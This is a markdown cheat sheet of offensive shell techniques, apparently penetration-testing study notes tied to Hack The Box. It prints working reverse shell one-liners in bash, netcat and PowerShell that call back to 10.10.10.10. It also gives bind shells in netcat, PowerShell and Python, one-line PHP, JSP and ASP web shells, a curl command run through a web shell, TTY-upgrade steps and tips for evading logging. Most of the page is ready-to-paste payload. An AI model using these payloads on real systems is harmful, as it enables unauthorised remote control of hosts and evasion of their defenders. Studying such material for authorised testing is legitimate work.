# Shells

Shells can be used to leverage an RCE vulnerability to perform arbitrary
actions on a remote host.

Listed below are a few different types of shells:
| Type          | Description                                                 |
|---------------|-------------------------------------------------------------|
| Reverse Shell | Connects from the exploited host to our system              |
| Bind Shell    | Opens a port on the exploited host and allows us to connect |
| Web Shell     | Allows us to run commands on the remote host via HTTP       |


## Reverse Shell

A reverse shell executes code on the remote host instructing it to connect back
to our machine (or C2 server) and accept commands to run. This shell is the
most common variety due to its ease of use and its ability to bypass most
firewall configurations.

Reverse shells are fragile, however, because once the connection is dropped,
the exploit will need to be run again to get it back, which may not always be
possible or practical.

### Netcat listener

A netcat listener can be used to accept reverse shell connections using the
following command:

```bash
nc -lvnp 1234
```

Breakdown:

| Flag    | Description                                              |
|---------|----------------------------------------------------------|
| -l      | Listen mode                                              |
| -v      | Verbose; prints to the console when a connection is made |
| -n 1234 | TCP port number to listen on                             |

### Reverse Shell Commands

There are many reverse shell commands that can be used depending on the OS, the
exploited technology, and which commands we have available to us.
[Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
has a good list of various reverse shell commands we can use.

Here are some example reverse shell commands we can use.

Linux:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Windows:
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```


## Bind Shell

A bind shell listens on the remote host for connections and allows the attacker
to run commands over that connection.

NOTE: These should be used cautiously, as this could also give another
(potentially unauthorized) attacker access to the machine as well, unless
properly secured.

Bind shells may also be harder to leverage since they require Layer 3 (routable
IP) access to the remote host on the chosen port (which may be blocked by a
firewall configuration), and are more likely to be flagged by EDR & other
malware defenses & alerting systems due to the relative infrequency of opening
public listen ports on a machine compared to outgoing connections.

Here are some example bind shell commands (listening on port 1234).

Linux (bash, netcat):
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Windows (Powershell):
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

Cross-platform (python):
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```


## Upgrading to a TTY

After acquiring a reverse shell, we can run commands, but won't have full
interactive access like we would with something like SSH. For example, there is
no prompt to indicate that the shell is even ready to accept a new command. In
order to recify this, we need to upgrade to a TTY, or more accurately, a PTY
(aka pseudo-terminal). If python is installed, this can be done with the
following command:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

After that, we should get a bash shell that communicates with our terminal
using ANSI escape sequences. However, our terminal is still configured in
line-buffering mode, and needs to be configured for a raw TTY protocol. To do
this, we need to background our reverse shell using Ctrl+Z and run the
following command:

```bash
stty raw -echo
```

Now, we can run the `fg` command to bring our reverse shell back, and we should
have raw TTY-based shell access!

NOTE: This method is also more likely to be detected by the blue team's
defenses, since it is not common for applications like web servers to be
opening pseudo-terminals. This is a noisy attack. Personally, I'd write my own
payload if I need something like this.

I don't care to go into detail here, so I'll just leave these for reference:

```
sploders101@htb[/htb]$ echo $TERM

xterm-256color
```
```
sploders101@htb[/htb]$ stty size

67 318
```
```
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

## Web Shell

A web shell is code on a web server (usually something like a PHP, ASPX, or CGI
script) that accepts commands, executes them, and prints out the response.

Common web-shell scripts:

php:
```php
<?php system($_REQUEST["cmd"]); ?>
```

jsp:
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

asp:
```asp
<% eval request("cmd") %>
```

### Uploading a web shell

Web shells need to be uploaded to the remote server before they can be used.
This is typically done by leveraging one of the following vulnerabilities:

* Path traversal in an upload endpoint
* Remote code execution

In order to upload the script to the right location, we may need to know the
webroot. Here is a list of default webroots for common servers:

| Server | Default Webroot       |
|--------|-----------------------|
| Apache | /var/www/html         |
| Nginx  | /usr/local/nginx/html |
| IIS    | C:\\inetpub\\wwwroot  |
| XAMPP  | C:\\xampp\\htdocs     |

Once the web shell is uploaded, we can access it by sending our command through
the `cmd` query parameter. Here's an example:

```bash
sploders101@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Web shells can be useful for attacking legacy infrastructure, since they blend
in with the environment, disguising themselves just like any other part of the
victim's legitimate application.

However, depending on the host and blue team's defenses, they may also be
easier to catch since web servers often keep access logs that would disclose
the reverse shell. If it is necessary to evade detection, it may be better to
craft a more sophisticated web shell that uses commands from a POST body, which
wouldn't usually be logged to any central logging locations or monitored, since
they may also contain legitimate confidential user data.
